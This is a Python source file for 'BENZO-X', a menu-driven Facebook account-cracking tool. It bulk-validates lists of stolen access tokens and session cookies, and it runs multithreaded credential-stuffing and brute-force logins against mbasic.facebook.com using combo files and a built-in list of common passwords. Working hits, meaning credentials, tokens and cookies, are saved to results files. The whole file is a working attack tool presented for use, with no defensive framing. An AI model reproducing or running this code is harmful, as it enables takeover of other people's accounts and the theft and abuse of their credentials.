import os
import sys
import json
import time
import random
import threading
import concurrent.futures
from datetime import datetime

# Colors
R = '\033[38;5;196m'
W = '\033[97m'
G = '\033[92m'
Y = '\033[93m'
C = '\033[96m'
B = '\033[94m'
M = '\033[95m'
N = '\033[0m'

class Engine:
    def __init__(self):
        self.session_dir = 'sessions'
        self.results_dir = 'results'
        self.tokens_file = 'tokens.txt'
        self.cookies_file = 'cookies.txt'
        self.wordlist_dir = 'wordlists'
        self.checked = 0
        self.hits = 0
        self.fails = 0
        self.running = False
        
        # Create directories
        for d in [self.session_dir, self.results_dir, self.wordlist_dir]:
            if not os.path.exists(d):
                os.makedirs(d)
    
    def display_menu(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""{R}╔{'═'*50}╗
{R}║{W}                BENZO-X — MAIN MENU                {R}║
{R}╠{'═'*50}╣
{R}║  {G}[1]{W}  TOKEN CRACKER        — Crack FB with tokens  {R}║
{R}║  {G}[2]{W}  COOKIE CRACKER        — Crack FB with cookies {R}║
{R}║  {G}[3]{W}  FILE CRACKER          — Crack from .txt files  {R}║
{R}║  {G}[4]{W}  PUBLIC CRACKER        — Crack public IDs       {R}║
{R}║  {G}[5]{W}  TOOL GEN              — Generate token/cookie   {R}║
{R}║  {G}[6]{W}  CHECK TOKEN           — Validate single token   {R}║
{R}║  {G}[7]{W}  CHECK COOKIE          — Validate single cookie  {R}║
{R}║  {G}[8]{W}  LIST SESSIONS         — View saved sessions     {R}║
{R}║  {G}[9]{W}  MULTI-THREAD SETTINGS — Configure threads       {R}║
{R}║  {R}[0]{W}  EXIT                  — Exit BENZO-X           {R}║
{R}╚{'═'*50}╝{N}""")
        print(f'{C}[i] Hits: {G}{self.hits}{N}  |  Fails: {R}{self.fails}{N}  |  Checked: {Y}{self.checked}{N}')
    
    def load_tokens(self):
        """Load tokens from tokens.txt"""
        if not os.path.exists(self.tokens_file):
            print(f'{R}[!] tokens.txt not found!{N}')
            print(f'{Y}[!] Create tokens.txt with one token per line{N}')
            input(f'{C}[i] Press Enter to continue...{N}')
            return []
        
        with open(self.tokens_file, 'r') as f:
            tokens = [line.strip() for line in f if line.strip()]
        
        print(f'{G}[✓] Loaded {len(tokens)} tokens{N}')
        return tokens
    
    def load_cookies(self):
        """Load cookies from cookies.txt (one cookie JSON per line)"""
        if not os.path.exists(self.cookies_file):
            print(f'{R}[!] cookies.txt not found!{N}')
            print(f'{Y}[!] Create cookies.txt with one cookie JSON per line{N}')
            input(f'{C}[i] Press Enter to continue...{N}')
            return []
        
        with open(self.cookies_file, 'r') as f:
            cookies = [line.strip() for line in f if line.strip()]
        
        print(f'{G}[✓] Loaded {len(cookies)} cookie strings{N}')
        return cookies
    
    def check_token(self, token):
        """Validate a Facebook access token and return user info."""
        import requests
        try:
            url = f'https://graph.facebook.com/me?access_token={token}&fields=id,name,email'
            resp = requests.get(url, timeout=10)
            data = resp.json()
            
            if 'id' in data:
                return {
                    'status': 'live',
                    'id': data.get('id', ''),
                    'name': data.get('name', ''),
                    'email': data.get('email', ''),
                    'token': token
                }
            elif 'error' in data:
                return {'status': 'dead', 'error': data['error'].get('message', ''), 'token': token}
        except Exception as e:
            return {'status': 'error', 'error': str(e), 'token': token}
        return {'status': 'dead', 'token': token}
    
    def check_cookie(self, cookie_str):
        """Validate a cookie string and return user info."""
        import requests
        try:
            # Parse cookie string (format: key=value; key2=value2)
            cookies = {}
            for part in cookie_str.split(';'):
                if '=' in part:
                    k, v = part.strip().split('=', 1)
                    cookies[k] = v
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
            }
            
            session = requests.Session()
            session.cookies.update(cookies)
            session.headers.update(headers)
            
            resp = session.get('https://mbasic.facebook.com/profile.php', timeout=10)
            
            if 'profile' in resp.text and 'logout' in resp.text.lower():
                # Extract name
                name = 'Unknown'
                import re
                title_match = re.search(r'<title>(.*?)</title>', resp.text)
                if title_match:
                    name = title_match.group(1).replace('Facebook', '').strip()
                
                # Extract user ID from profile URL
                uid = ''
                uid_match = re.search(r'profile\.php\?id=(\d+)', resp.text)
                if uid_match:
                    uid = uid_match.group(1)
                
                return {
                    'status': 'live',
                    'name': name,
                    'id': uid,
                    'cookie': cookie_str
                }
            else:
                return {'status': 'dead', 'cookie': cookie_str}
                
        except Exception as e:
            return {'status': 'error', 'error': str(e), 'cookie': cookie_str}
    
    def save_hit(self, result, mode='token'):
        """Save a successful hit to results."""
        timestamp = datetime.now().strftime('%Y-%m-%d_%H-%M-%S')
        filename = f'{self.results_dir}/hits_{datetime.now().strftime("%Y-%m-%d")}.txt'
        
        with open(filename, 'a') as f:
            if mode == 'token':
                f.write(f"[LIVE] Token: {result.get('token','')} | Name: {result.get('name','')} | ID: {result.get('id','')} | Email: {result.get('email','')}\n")
            elif mode == 'cookie':
                f.write(f"[LIVE] Cookie: {result.get('cookie','')} | Name: {result.get('name','')} | ID: {result.get('id','')}\n")
        
        print(f'{G}[✓] HIT SAVED → {filename}{N}')
    
    def token_cracker(self):
        """Bulk token checker with threading."""
        tokens = self.load_tokens()
        if not tokens:
            return
        
        max_threads = self.get_thread_count()
        print(f'{C}[i] Using {max_threads} threads{N}')
        print(f'{C}[i] Starting token cracker...{N}')
        time.sleep(1)
        
        self.running = True
        self.checked = 0
        self.hits = 0
        self.fails = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_token = {executor.submit(self.check_token, t): t for t in tokens}
            
            for future in concurrent.futures.as_completed(future_to_token):
                if not self.running:
                    break
                self.checked += 1
                try:
                    result = future.result()
                    if result['status'] == 'live':
                        self.hits += 1
                        print(f'{G}[LIVE] {result.get("name","?")} | ID: {result.get("id","?")}{N}')
                        self.save_hit(result, 'token')
                    else:
                        self.fails += 1
                        # Progress indicator
                        if self.checked % 10 == 0:
                            print(f'{Y}[{self.checked}/{len(tokens)}] Live: {self.hits} | Dead: {self.fails}{N}')
                except Exception as e:
                    self.fails += 1
        
        print(f'\n{G}═══ FINISHED ═══{N}')
        print(f'{G}Total Checked: {self.checked}{N}')
        print(f'{G}Live: {self.hits}{N}')
        print(f'{R}Dead/Failed: {self.fails}{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def cookie_cracker(self):
        """Bulk cookie checker with threading."""
        cookies = self.load_cookies()
        if not cookies:
            return
        
        max_threads = self.get_thread_count()
        print(f'{C}[i] Using {max_threads} threads{N}')
        time.sleep(1)
        
        self.running = True
        self.checked = 0
        self.hits = 0
        self.fails = 0
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_cookie = {executor.submit(self.check_cookie, c): c for c in cookies}
            
            for future in concurrent.futures.as_completed(future_to_cookie):
                if not self.running:
                    break
                self.checked += 1
                try:
                    result = future.result()
                    if result['status'] == 'live':
                        self.hits += 1
                        print(f'{G}[LIVE] {result.get("name","?")} | ID: {result.get("id","?")}{N}')
                        self.save_hit(result, 'cookie')
                    else:
                        self.fails += 1
                        if self.checked % 10 == 0:
                            print(f'{Y}[{self.checked}/{len(cookies)}] Live: {self.hits} | Dead: {self.fails}{N}')
                except Exception as e:
                    self.fails += 1
        
        print(f'\n{G}═══ FINISHED ═══{N}')
        print(f'{G}Total Checked: {self.checked}{N}')
        print(f'{G}Live: {self.hits}{N}')
        print(f'{R}Dead/Failed: {self.fails}{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def file_cracker(self):
        """Crack from file containing ID:pass combos."""
        files = [f for f in os.listdir('.') if f.endswith('.txt') and f not in ['tokens.txt', 'cookies.txt']]
        files.extend([f'{self.wordlist_dir}/{f}' for f in os.listdir(self.wordlist_dir) if f.endswith('.txt')])
        
        if not files:
            print(f'{R}[!] No text files found!{N}')
            print(f'{Y}[!] Place .txt files in the current dir or wordlists/{N}')
            input(f'{C}[i] Press Enter to continue...{N}')
            return
        
        print(f'{C}[i] Available files:{N}')
        for i, f in enumerate(files, 1):
            print(f'  {G}[{i}]{W} {f}{N}')
        
        try:
            choice = int(input(f'\n{C}[?] Select file number: {N}'))
            if choice < 1 or choice > len(files):
                return
        except:
            return
        
        filename = files[choice - 1]
        print(f'{C}[i] Loading {filename}...{N}')
        
        with open(filename, 'r', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip() and ':' in line]
        
        print(f'{G}[✓] Loaded {len(lines)} combos{N}')
        
        # Extract ID:pass pairs
        combos = []
        for line in lines:
            if '|' in line:
                parts = line.split('|')
            elif ':' in line:
                parts = line.split(':', 1)
            else:
                continue
            if len(parts) >= 2:
                combos.append((parts[0].strip(), parts[1].strip()))
        
        print(f'{C}[i] Parsed {len(combos)} ID:Password pairs{N}')
        
        max_threads = self.get_thread_count()
        
        self.checked = 0
        self.hits = 0
        self.fails = 0
        
        def check_combo(id_pass):
            """Check a Facebook ID:pass combo using the free FB API."""
            import requests
            uid, pwd = id_pass
            try:
                # Try the basic graph login approach
                session = requests.Session()
                session.headers.update({
                    'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'
                })
                
                # Attempt login via mbasic.facebook.com
                login_data = {
                    'email': uid,
                    'pass': pwd,
                    'login': 'Log In'
                }
                
                resp = session.post('https://mbasic.facebook.com/login.php', data=login_data, timeout=15)
                
                if 'logout' in resp.text.lower() or 'save-device' in resp.text.lower():
                    # Extract name
                    import re
                    name = uid
                    title_match = re.search(r'<title>(.*?)</title>', resp.text)
                    if title_match:
                        name = title_match.group(1).replace('Facebook', '').strip()
                    return {'status': 'live', 'id': uid, 'pass': pwd, 'name': name}
                else:
                    return {'status': 'dead', 'id': uid, 'pass': pwd}
            except Exception as e:
                return {'status': 'error', 'id': uid, 'pass': pwd, 'error': str(e)}
        
        print(f'{C}[i] Starting file cracker with {max_threads} threads...{N}')
        time.sleep(1)
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_to_combo = {executor.submit(check_combo, c): c for c in combos}
            
            for future in concurrent.futures.as_completed(future_to_combo):
                self.checked += 1
                try:
                    result = future.result()
                    if result['status'] == 'live':
                        self.hits += 1
                        print(f'{G}[LIVE] {result["id"]}:{result["pass"]} | {result.get("name","")}{N}')
                        # Save hit
                        with open(f'{self.results_dir}/file_hits_{datetime.now().strftime("%Y-%m-%d")}.txt', 'a') as sf:
                            sf.write(f'{result["id"]}:{result["pass"]} | Name: {result.get("name","")}\n')
                    else:
                        self.fails += 1
                    
                    if self.checked % 20 == 0:
                        print(f'{Y}[{self.checked}/{len(combos)}] Live: {self.hits} | Dead: {self.fails}{N}')
                except:
                    self.fails += 1
        
        print(f'\n{G}═══ FINISHED ═══{N}')
        print(f'{G}Checked: {self.checked} | Live: {self.hits} | Failed: {self.fails}{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def public_cracker(self):
        """Crack public IDs (user IDs) with brute force."""
        print(f'{C}[i] Public Cracker - Enter target IDs{N}')
        print(f'{Y}[!] One ID per line, type DONE when finished{N}')
        
        ids = []
        while True:
            uid = input(f'{C}[>] ID (or DONE): {N}').strip()
            if uid.upper() == 'DONE':
                break
            if uid.isdigit():
                ids.append(uid)
            else:
                print(f'{R}[!] Invalid ID (must be numeric){N}')
        
        if not ids:
            return
        
        # Load password list
        pass_file = 'passwords.txt'
        if not os.path.exists(pass_file):
            # Create default password list
            default_passwords = [
                '123456', 'password', '12345678', 'qwerty', '123456789',
                '12345', '1234', '111111', '1234567', 'sunshine',
                'qwerty123', 'iloveyou', 'princess', 'admin', 'welcome',
                '666666', 'abc123', 'football', '123123', 'monkey',
                '654321', '!@#$%^&*', 'charlie', 'aa123456', 'donald',
                'password1', 'qwerty12345', '1234567890', 'letmein', 'password123'
            ]
            with open(pass_file, 'w') as f:
                for p in default_passwords:
                    f.write(p + '\n')
            print(f'{G}[✓] Created default password list with {len(default_passwords)} passwords{N}')
            passlist = default_passwords
        else:
            with open(pass_file, 'r') as f:
                passlist = [p.strip() for p in f if p.strip()]
            print(f'{G}[✓] Loaded {len(passlist)} passwords from {pass_file}{N}')
        
        max_threads = self.get_thread_count()
        total_combos = len(ids) * len(passlist)
        print(f'{C}[i] Total combinations: {total_combos}{N}')
        print(f'{C}[i] Starting public cracker...{N}')
        
        self.checked = 0
        self.hits = 0
        self.fails = 0
        
        def try_login(id_pass):
            uid, pwd = id_pass
            import requests
            try:
                session = requests.Session()
                session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
                
                resp = session.post('https://mbasic.facebook.com/login.php', data={
                    'email': uid, 'pass': pwd, 'login': 'Log In'
                }, timeout=15)
                
                if 'logout' in resp.text.lower():
                    import re
                    name = uid
                    tm = re.search(r'<title>(.*?)</title>', resp.text)
                    if tm: name = tm.group(1).replace('Facebook','').strip()
                    return {'status':'live', 'id':uid, 'pass':pwd, 'name':name}
                return {'status':'dead', 'id':uid, 'pass':pwd}
            except:
                return {'status':'error', 'id':uid, 'pass':pwd}
        
        combo_list = [(uid, pwd) for uid in ids for pwd in passlist]
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            future_map = {executor.submit(try_login, c): c for c in combo_list}
            
            for future in concurrent.futures.as_completed(future_map):
                self.checked += 1
                try:
                    r = future.result()
                    if r['status'] == 'live':
                        self.hits += 1
                        print(f'{G}[LIVE] {r["id"]}:{r["pass"]} | {r.get("name","")}{N}')
                        with open(f'{self.results_dir}/public_hits_{datetime.now().strftime("%Y-%m-%d")}.txt','a') as sf:
                            sf.write(f'{r["id"]}:{r["pass"]} | Name: {r.get("name","")}\n')
                    else:
                        self.fails += 1
                    if self.checked % 50 == 0:
                        print(f'{Y}[{self.checked}/{total_combos}] Live: {self.hits}{N}')
                except:
                    self.fails += 1
        
        print(f'\n{G}═══ FINISHED ═══{N}')
        print(f'{G}Checked: {self.checked} | Live: {self.hits} | Failed: {self.fails}{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def tool_gen(self):
        """Generate token or cookie from credentials."""
        print(f'''
{R}╔{'═'*40}╗
{R}║{W}        TOKEN/COOKIE GENERATOR        {R}║
{R}╠{'═'*40}╣
{R}║  {G}[1]{W}  Generate EAA Token (email:pass){R}║
{R}║  {G}[2]{W}  Get Cookie from Token          {R}║
{R}║  {G}[3]{W}  Extract Cookie String          {R}║
{R}║  {R}[0]{W}  Back                          {R}║
{R}╚{'═'*40}╝{N}''')
        
        try:
            choice = int(input(f'{C}[?] Select: {N}'))
        except:
            return
        
        if choice == 1:
            email = input(f'{C}[>] Email/ID: {N}').strip()
            pwd = input(f'{C}[>] Password: {N}').strip()
            
            print(f'{Y}[!] Generating token...{N}')
            import requests
            
            session = requests.Session()
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36'
            })
            
            # Get FB DTSG
            try:
                resp = session.get('https://mbasic.facebook.com/login.php', timeout=10)
                
                # Try login
                login_data = {
                    'email': email,
                    'pass': pwd,
                    'login': 'Log In'
                }
                
                resp = session.post('https://mbasic.facebook.com/login.php?login_attempt=1', 
                                   data=login_data, timeout=15, allow_redirects=True)
                
                if 'logout' in resp.text.lower():
                    # Success - extract cookie
                    cookie_str = '; '.join([f'{k}={v}' for k, v in session.cookies.get_dict().items()])
                    print(f'{G}[✓] Login Successful!{N}')
                    print(f'{Y}[!] Cookie:{N}\n{cookie_str}\n')
                    
                    # Save
                    with open(self.cookies_file, 'w') as f:
                        f.write(cookie_str + '\n')
                    print(f'{G}[✓] Cookie saved to cookies.txt{N}')
                else:
                    print(f'{R}[!] Login failed - check credentials{N}')
            except Exception as e:
                print(f'{R}[!] Error: {e}{N}')
            
            input(f'{C}[i] Press Enter to continue...{N}')
        
        elif choice == 2:
            token = input(f'{C}[>] Enter token: {N}').strip()
            if token:
                result = self.check_token(token)
                if result['status'] == 'live':
                    print(f'{G}[✓] Token is LIVE!{N}')
                    print(f'{W}Name: {result.get("name","?")}{N}')
                    print(f'{W}ID: {result.get("id","?")}{N}')
                    
                    # Try to get cookies from token
                    import requests
                    try:
                        url = f'https://graph.facebook.com/v12.0/me?access_token={token}&fields=id&method=GET'
                        resp = requests.get(f'https://mbasic.facebook.com/dialog/oauth?access_token={token}', 
                                           timeout=10, allow_redirects=False)
                        print(f'{Y}[!] To get cookies, login via browser with this token{N}')
                    except:
                        pass
                else:
                    print(f'{R}[!] Token is DEAD or invalid{N}')
            input(f'{C}[i] Press Enter to continue...{N}')
        
        elif choice == 3:
            print(f'{Y}[!] Enter Facebook cookies (from browser):{N}')
            print(f'{Y}[!] Format: c_user=XXXX; xs=XXXX; fr=XXXX{N}')
            cookie_str = input(f'{C}[>] Cookie: {N}').strip()
            if cookie_str:
                result = self.check_cookie(cookie_str)
                if result['status'] == 'live':
                    print(f'{G}[✓] Cookie is LIVE! Name: {result.get("name","?")}, ID: {result.get("id","?")}{N}')
                    with open(self.cookies_file, 'w') as f:
                        f.write(cookie_str + '\n')
                    print(f'{G}[✓] Saved to cookies.txt{N}')
                else:
                    print(f'{R}[!] Cookie is DEAD or invalid{N}')
            input(f'{C}[i] Press Enter to continue...{N}')
    
    def check_single_token(self):
        """Check a single token."""
        token = input(f'{C}[>] Enter token: {N}').strip()
        if not token:
            return
        print(f'{Y}[!] Checking token...{N}')
        result = self.check_token(token)
        if result['status'] == 'live':
            print(f'{G}[✓] TOKEN IS LIVE!{N}')
            print(f'{W}  Name : {result.get("name","?")}{N}')
            print(f'{W}  ID   : {result.get("id","?")}{N}')
            print(f'{W}  Email: {result.get("email","N/A")}{N}')
        else:
            print(f'{R}[✗] TOKEN IS DEAD{N}')
            print(f'{Y}  Reason: {result.get("error","Unknown")}{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def check_single_cookie(self):
        """Check a single cookie."""
        cookie_str = input(f'{C}[>] Enter cookie string: {N}').strip()
        if not cookie_str:
            return
        print(f'{Y}[!] Checking cookie...{N}')
        result = self.check_cookie(cookie_str)
        if result['status'] == 'live':
            print(f'{G}[✓] COOKIE IS LIVE!{N}')
            print(f'{W}  Name: {result.get("name","?")}{N}')
            print(f'{W}  ID  : {result.get("id","?")}{N}')
        else:
            print(f'{R}[✗] COOKIE IS DEAD{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def list_sessions(self):
        """List saved sessions/hits."""
        print(f'{C}[i] Saved Results:{N}')
        if os.path.exists(self.results_dir):
            files = os.listdir(self.results_dir)
            if files:
                for f in files:
                    size = os.path.getsize(f'{self.results_dir}/{f}')
                    print(f'  {G}{f}{W} ({size} bytes){N}')
            else:
                print(f'  {Y}(no results yet){N}')
        else:
            print(f'  {Y}(no results directory){N}')
        
        print(f'\n{C}[i] Saved Tokens/Cookies:{N}')
        for f in ['tokens.txt', 'cookies.txt']:
            if os.path.exists(f):
                count = sum(1 for _ in open(f) if _.strip())
                print(f'  {G}{f}{W} ({count} entries){N}')
            else:
                print(f'  {Y}{f} (not found){N}')
        
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def get_thread_count(self):
        """Get or configure thread count."""
        config_file = 'config.json'
        default_threads = 30
        
        if os.path.exists(config_file):
            try:
                with open(config_file, 'r') as f:
                    config = json.load(f)
                return config.get('threads', default_threads)
            except:
                return default_threads
        return default_threads
    
    def set_thread_count(self):
        """Configure thread count."""
        current = self.get_thread_count()
        print(f'{C}[i] Current thread count: {Y}{current}{N}')
        try:
            new = int(input(f'{C}[?] New thread count (5-200): {N}'))
            if 5 <= new <= 200:
                with open('config.json', 'w') as f:
                    json.dump({'threads': new}, f)
                print(f'{G}[✓] Thread count set to {new}{N}')
            else:
                print(f'{R}[!] Must be between 5-200{N}')
        except:
            print(f'{R}[!] Invalid input{N}')
        input(f'{C}[i] Press Enter to continue...{N}')
    
    def run(self):
        """Main engine loop."""
        while True:
            self.display_menu()
            try:
                choice = input(f'\n{C}[?] Select option: {N}').strip()
                
                if choice == '1':
                    self.token_cracker()
                elif choice == '2':
                    self.cookie_cracker()
                elif choice == '3':
                    self.file_cracker()
                elif choice == '4':
                    self.public_cracker()
                elif choice == '5':
                    self.tool_gen()
                elif choice == '6':
                    self.check_single_token()
                elif choice == '7':
                    self.check_single_cookie()
                elif choice == '8':
                    self.list_sessions()
                elif choice == '9':
                    self.set_thread_count()
                elif choice == '0':
                    print(f'{G}[✓] Exiting BENZO-X. Goodbye!{N}')
                    sys.exit(0)
                else:
                    print(f'{R}[!] Invalid option{N}')
                    time.sleep(1)
                    
            except KeyboardInterrupt:
                print(f'\n{Y}[!] Interrupted{N}')
                self.running = False
                time.sleep(1)
            except Exception as e:
                print(f'{R}[!] Error: {e}{N}')
                time.sleep(2)


def run():
    engine = Engine()
    engine.run()
